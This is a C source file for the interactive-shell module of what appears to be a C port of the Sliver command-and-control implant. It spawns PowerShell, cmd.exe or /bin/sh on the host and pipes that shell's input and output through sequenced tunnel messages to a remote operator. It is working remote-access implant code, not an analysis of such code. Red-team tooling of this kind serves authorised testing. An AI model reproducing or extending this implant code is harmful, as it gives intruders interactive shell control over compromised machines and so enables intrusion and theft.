/* src/modes/shell.c - interactive shell over Sliver tunnel messages.
 *
 * Protocol (mirrors the Go implant):
 *   ShellReq{Path,...}  -> Shell{Pid, TunnelID}   (response envelope)
 *   TunnelData{TunnelID, Data} -> bytes to the child's stdin (no response)
 *   TunnelData{TunnelID, Data} <- child stdout, sent by the reader thread
 *   TunnelData{TunnelID, Closed} -> peer closed, child stdin is closed
 */
#include "sliver/rpc.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if defined(_WIN32)
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#endif

#include "sliver/fs.h"
#include "sliver/log.h"
#include "sliver/platform.h"
#include "sliver/proc.h"

#define SLIVER_MAX_TUNNELS 8
#define SLIVER_SHELL_READ_CHUNK 16384

typedef struct {
  uint64_t id;
  int used;
  sliver_child_t *child;
  uint64_t sequence;
  uint64_t read_sequence;
  sliver_mutex_t *seq_lock; /* guards sequence/read_sequence across reader + session */
  volatile int stop;
  int thread_running;
  int closing;
} shell_tunnel_t;

typedef int (*sliver_shell_send_fn)(uint32_t type, const void *data, size_t len);

static shell_tunnel_t g_tunnels[SLIVER_MAX_TUNNELS];
static sliver_shell_send_fn g_send = NULL;
static sliver_mutex_t *g_shell_lock = NULL;

static void shell_lock(void) {
  if (g_shell_lock == NULL) {
    g_shell_lock = sliver_mutex_create();
  }
  if (g_shell_lock != NULL) {
    sliver_mutex_lock(g_shell_lock);
  }
}

static void shell_unlock(void) {
  if (g_shell_lock != NULL) {
    sliver_mutex_unlock(g_shell_lock);
  }
}

void sliver_shell_set_sender(sliver_shell_send_fn fn) { g_send = fn; }

static shell_tunnel_t *tunnel_find(uint64_t id) {
  for (size_t i = 0; i < SLIVER_MAX_TUNNELS; ++i) {
    if (g_tunnels[i].used && !g_tunnels[i].closing && g_tunnels[i].id == id) {
      return &g_tunnels[i];
    }
  }
  return NULL;
}

static shell_tunnel_t *tunnel_alloc(uint64_t id, sliver_child_t *child) {
  shell_lock();
  for (size_t i = 0; i < SLIVER_MAX_TUNNELS; ++i) {
    if (!g_tunnels[i].used) {
      memset(&g_tunnels[i], 0, sizeof(g_tunnels[i]));
      g_tunnels[i].used = 1;
      g_tunnels[i].id = id;
      g_tunnels[i].child = child;
      g_tunnels[i].sequence = 0;
      g_tunnels[i].seq_lock = sliver_mutex_create();
      shell_unlock();
      return &g_tunnels[i];
    }
  }
  shell_unlock();
  return NULL;
}

/* Releases a tunnel. While its reader thread still runs, ownership of the child
 * process object passes to that thread: freeing it here would leave the thread
 * reading from a freed handle (-> heap corruption / frozen session). */
static void tunnel_release(shell_tunnel_t *t) {
  if (t == NULL || !t->used) {
    return;
  }
  t->stop = 1;
  if (t->child != NULL) {
    /* Unblocks the reader thread's ReadFile so it can finish on its own. */
    sliver_child_terminate(t->child);
    sliver_child_close_stdin(t->child);
  }
  shell_lock();
  if (t->thread_running) {
    t->closing = 1;
    shell_unlock();
    return;
  }
  if (t->child != NULL) {
    sliver_child_free(t->child);
  }
  memset(t, 0, sizeof(*t));
  shell_unlock();
}

void sliver_shell_shutdown(void) {
  shell_lock();
  for (size_t i = 0; i < SLIVER_MAX_TUNNELS; ++i) {
    g_tunnels[i].stop = 1;
    if (g_tunnels[i].child != NULL) {
      sliver_child_terminate(g_tunnels[i].child);
      sliver_child_close_stdin(g_tunnels[i].child);
    }
    g_tunnels[i].closing = 1;
  }
  shell_unlock();
}

/* Data frame. The cumulative acknowledgement rides along in Ack (Go never sends
 * a standalone ACK frame: such a frame would consume a sequence number and make
 * the peer drop the next real frame as a duplicate). */
static int send_tunnel_data(shell_tunnel_t *t, const void *data, size_t len, int closed) {
  sliver_buf_t msg;
  uint64_t seq;
  uint64_t ack;
  int rc;

  (void)closed; /* closing goes through MsgTunnelClose, never a data frame */
  if (g_send == NULL) {
    return -1;
  }
  if (t->seq_lock != NULL) {
    sliver_mutex_lock(t->seq_lock);
  }
  seq = t->sequence;
  ack = t->read_sequence;
  if (t->seq_lock != NULL) {
    sliver_mutex_unlock(t->seq_lock);
  }
  sliver_buf_init(&msg);
  if (sliver_tunnel_data_encode(&msg, data, len, 0, seq, t->id, ack) != 0) {
    sliver_buf_free(&msg);
    return -1;
  }
  rc = g_send(SLIVER_MSG_TUNNEL_DATA, msg.data, msg.len);
  LOG_DEBUG("shell: send_tunnel_data id=%llu seq=%llu ack=%llu len=%u rc=%d",
            (unsigned long long)t->id, (unsigned long long)seq, (unsigned long long)ack,
            (unsigned)len, rc);
  sliver_buf_free(&msg);
  if (rc == 0) {
    if (t->seq_lock != NULL) {
      sliver_mutex_lock(t->seq_lock);
    }
    t->sequence++;
    if (t->seq_lock != NULL) {
      sliver_mutex_unlock(t->seq_lock);
    }
  }
  return rc;
}

/* Terminal: MsgTunnelClose{TunnelData{Closed, Sequence = exclusive prefix}}. */
static int send_tunnel_close(shell_tunnel_t *t) {
  sliver_buf_t msg;
  uint64_t seq;
  int rc;

  if (g_send == NULL) {
    return -1;
  }
  if (t->seq_lock != NULL) {
    sliver_mutex_lock(t->seq_lock);
  }
  seq = t->sequence;
  if (t->seq_lock != NULL) {
    sliver_mutex_unlock(t->seq_lock);
  }
  sliver_buf_init(&msg);
  if (sliver_tunnel_close_encode(&msg, seq, t->id) != 0) {
    sliver_buf_free(&msg);
    return -1;
  }
  rc = g_send(SLIVER_MSG_TUNNEL_CLOSE, msg.data, msg.len);
  sliver_buf_free(&msg);
  return rc;
}

/* Gap recovery: ask the peer to resend from read_sequence (control frame). */
static int send_tunnel_resend(shell_tunnel_t *t) {
  sliver_buf_t msg;
  uint64_t seq;
  uint64_t ack;
  int rc;

  if (g_send == NULL) {
    return -1;
  }
  if (t->seq_lock != NULL) {
    sliver_mutex_lock(t->seq_lock);
  }
  seq = t->sequence;
  ack = t->read_sequence;
  if (t->seq_lock != NULL) {
    sliver_mutex_unlock(t->seq_lock);
  }
  sliver_buf_init(&msg);
  if (sliver_tunnel_resend_encode(&msg, seq, t->id, ack) != 0) {
    sliver_buf_free(&msg);
    return -1;
  }
  rc = g_send(SLIVER_MSG_TUNNEL_DATA, msg.data, msg.len);
  sliver_buf_free(&msg);
  return rc;
}

typedef struct {
  shell_tunnel_t *tunnel;
} shell_reader_arg_t;

/* Number of trailing bytes that belong to a UTF-8 sequence cut by the read
 * boundary, so the conversion never sees a half character. */
static size_t utf8_incomplete_tail(const unsigned char *b, size_t n) {
  size_t i;
  for (i = 1; i <= 3 && i <= n; ++i) {
    unsigned char c = b[n - i];
    if ((c & 0xC0) != 0x80) {
      size_t need = (c < 0x80) ? 1u : (c < 0xE0) ? 2u : (c < 0xF0) ? 3u : 4u;
      return need > i ? i : 0;
    }
  }
  return 0;
}

static void shell_reader_thread(void *arg) {
  shell_reader_arg_t *r = (shell_reader_arg_t *)arg;
  shell_tunnel_t *t = r->tunnel;
  sliver_child_t *child = t->child;
  char buf[SLIVER_SHELL_READ_CHUNK + 4];
  size_t carry_len = 0;

  for (;;) {
    long n;
    size_t total, tail, conv;
    if (t->stop) {
      break;
    }
    n = sliver_child_read(child, buf + carry_len, SLIVER_SHELL_READ_CHUNK);
    if (n <= 0) {
      break;
    }
    total = carry_len + (size_t)n;
    tail = utf8_incomplete_tail((const unsigned char *)buf, total);
    conv = total - tail;
    if (conv != 0) {
#if defined(_WIN32)
      size_t converted = 0;
      char acp[SLIVER_SHELL_READ_CHUNK * 2 + 8];
      if (sliver_acp_from_utf8(buf, conv, acp, sizeof(acp), &converted) == 0) {
        if (send_tunnel_data(t, acp, converted, 0) != 0) {
          break;
        }
      } else
#endif
      if (send_tunnel_data(t, buf, conv, 0) != 0) {
        break;
      }
    }
    memmove(buf, buf + conv, tail);
    carry_len = tail;
  }
  if (carry_len != 0 && !t->stop) {
    (void)send_tunnel_data(t, buf, carry_len, 0); /* flush an odd trailing byte */
  }
  if (!t->stop) {
    (void)send_tunnel_close(t);
  }
  /* Kill the child when the reader ends: a shell left behind after `exit` kept a
   * powershell.exe alive in the process list. */
  if (child != NULL) {
    sliver_child_terminate(child);
  }
  /* The reader owns the child object while it runs: it is the only thread that
   * may free it (see tunnel_release). */
  shell_lock();
  if (child != NULL) {
    sliver_child_free(child);
  }
  t->child = NULL;
  t->thread_running = 0;
  if (t->seq_lock != NULL) {
    sliver_mutex_destroy(t->seq_lock);
    t->seq_lock = NULL;
  }
  memset(t, 0, sizeof(*t));
  shell_unlock();
  free(r);
}

static uint64_t next_tunnel_id(void) {
  static uint64_t counter = 0;
  counter++;
  return ((uint64_t)sliver_now_ms() << 16) ^ (uint64_t)(sliver_current_pid() & 0xffff) ^ counter;
}

/* Picks the shell the way the Go implant does: PowerShell configured for UTF-8
 * when available, otherwise cmd.exe switched to code page 65001 so Chinese (and
 * any other non-ASCII) output does not arrive as OEM bytes. */
static size_t build_shell_argv(const char *requested, const char *argv[4], char *path_buf,
                               size_t cap) {
#if defined(_WIN32)
  char candidate[512];
  DWORD n = GetEnvironmentVariableA("SystemRoot", candidate, (DWORD)sizeof(candidate));
  static char ps_path[512];
  static char cmd_path[512];
  size_t argc = 0;

  if (requested != NULL && requested[0] != '\0') {
    (void)snprintf(path_buf, cap, "%s", requested);
    if (_stricmp(requested, "cmd.exe") == 0 || _stricmp(requested, "cmd") == 0) {
      argv[argc++] = "/K";
      argv[argc++] = "chcp 65001>nul";
    }
    return argc;
  }
  if (n > 0 && n < sizeof(candidate)) {
    (void)snprintf(ps_path, sizeof(ps_path),
                   "%s\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", candidate);
    (void)snprintf(cmd_path, sizeof(cmd_path), "%s\\System32\\cmd.exe", candidate);
    if (sliver_fs_exists(ps_path)) {
      (void)snprintf(path_buf, cap, "%s", ps_path);
      argv[argc++] = "-NoExit";
      argv[argc++] = "-Command";
      argv[argc++] = "[Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8";
      return argc;
    }
    if (sliver_fs_exists(cmd_path)) {
      (void)snprintf(path_buf, cap, "%s", cmd_path);
      argv[argc++] = "/K";
      argv[argc++] = "chcp 65001>nul";
      return argc;
    }
  }
  (void)snprintf(path_buf, cap, "%s", "cmd.exe");
  argv[argc++] = "/K";
  argv[argc++] = "chcp 65001>nul";
  return argc;
#else
  (void)requested;
  (void)argv;
  (void)snprintf(path_buf, cap, "%s", "/bin/sh");
  return 0;
#endif
}

int sliver_rpc_handle_shell(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_shell_req_t sr;
  sliver_child_t *child = NULL;
  shell_tunnel_t *t;
  shell_reader_arg_t *arg;
  uint32_t pid = 0;
  uint64_t id;
  const char *argv[4];
  char shell_path[512];
  size_t argc;
  char err[256];

  if (sliver_shell_req_decode(req->data, req->data_len, &sr) != 0) {
    return -1;
  }
  /* Beacon mode has no duplex link: refuse instead of spawning a child whose
   * output could never reach the operator (the client would block forever). */
  if (!sliver_rpc_has_capability(SLIVER_CAP_TUNNEL)) {
    return sliver_shell_encode(out, sr.path, 0, 0, 0,
                               "shell is not available in beacon mode");
  }
  argc = build_shell_argv(sr.path, argv, shell_path, sizeof(shell_path));
  err[0] = '\0';
  if (sliver_child_spawn(shell_path, argv, argc, &child, &pid) != 0) {
    (void)snprintf(err, sizeof(err), "shell %s: cannot start (err %lu)", shell_path,
                   sliver_child_last_error());
    return sliver_shell_encode(out, shell_path, 0, 0, 0, err);
  }
  id = next_tunnel_id();
  /* The client allocates the tunnel id and sends it in ShellReq (field 8); we
   * must answer on that same tunnel or the client drops our frames. Only when
   * the request carries no id (older clients) do we pick one ourselves. */
  if (sr.tunnel_id != 0) {
    id = sr.tunnel_id;
  }
  t = tunnel_alloc(id, child);
  if (t == NULL) {
    sliver_child_terminate(child);
    sliver_child_free(child);
    return sliver_shell_encode(out, sr.path, 0, pid, 0, "shell: tunnel table full");
  }
  arg = (shell_reader_arg_t *)calloc(1, sizeof(*arg));
  if (arg != NULL) {
    arg->tunnel = t;
    t->thread_running = 1;
    /* The reader thread owns `arg` and the child object until it exits. */
    sliver_thread_t *th = sliver_thread_create(shell_reader_thread, arg);
    if (th == NULL) {
      t->thread_running = 0;
      free(arg);
      LOG_WARN("shell: cannot start reader thread");
    } else {
      sliver_thread_detach(th);
    }
  }
  LOG_DEBUG("shell: %s pid=%u tunnel=%llu", sr.path, pid, (unsigned long long)id);
  return sliver_shell_encode(out, sr.path, 0, pid, id, NULL);
}

int sliver_rpc_handle_tunnel_data(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_tunnel_data_t td;
  shell_tunnel_t *t;

  (void)out;
  if (sliver_tunnel_data_decode(req->data, req->data_len, &td) != 0) {
    return -2;
  }
  LOG_DEBUG("tunnel: inbound id=%llu len=%u seq=%llu ack=%llu closed=%d",
            (unsigned long long)td.tunnel_id, (unsigned)td.data_len,
            (unsigned long long)td.sequence, (unsigned long long)td.ack, td.closed);
  if (sliver_portfwd_tunnel_data(&td)) {
    return -2;
  }
  t = tunnel_find(td.tunnel_id);
  if (t == NULL) {
    /* Unknown tunnel: the Go implant simply drops such frames. Creating state
     * for them used to steal a portfwd slot and leave a sequence gap. */
    return -2;
  }
  {
    uint64_t want;
    int do_write = 0;
    int do_close = 0;
    int is_gap = 0;

    if (t->seq_lock != NULL) {
      sliver_mutex_lock(t->seq_lock);
    }
    want = t->read_sequence;
    if (td.sequence == want) {
      do_write = td.data_len != 0;
      do_close = td.closed != 0;
    } else if (td.sequence > want) {
      is_gap = 1;
    }
    if (t->seq_lock != NULL) {
      sliver_mutex_unlock(t->seq_lock);
    }

    if (do_write) {
      (void)sliver_child_write(t->child, td.data, td.data_len);
    }
    if (do_close) {
      sliver_child_close_stdin(t->child);
    }
    if (do_write || do_close) {
      if (t->seq_lock != NULL) {
        sliver_mutex_lock(t->seq_lock);
      }
      t->read_sequence++;
      if (t->seq_lock != NULL) {
        sliver_mutex_unlock(t->seq_lock);
      }
    }
    if (is_gap) {
      LOG_DEBUG("tunnel: gap on id=%llu (want %llu got %llu)", (unsigned long long)t->id,
                (unsigned long long)want, (unsigned long long)td.sequence);
      (void)send_tunnel_resend(t);
    }
  }
  return -2;
}

int sliver_rpc_handle_tunnel_close(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_tunnel_data_t td;
  (void)out;
  if (sliver_tunnel_data_decode(req->data, req->data_len, &td) == 0) {
    if (!sliver_portfwd_tunnel_close(td.tunnel_id)) {
      tunnel_release(tunnel_find(td.tunnel_id));
    }
  }
  return -2;
}

int sliver_rpc_handle_shell_resize(const sliver_envelope_t *req, sliver_buf_t *out) {
  (void)req;
  /* The server awaits a response on the same envelope id (unary RPC): answer with
   * an empty message, otherwise the client times out. Piped shells ignore the
   * size, ConPTY support comes later. */
  (void)out;
  return 0;
}










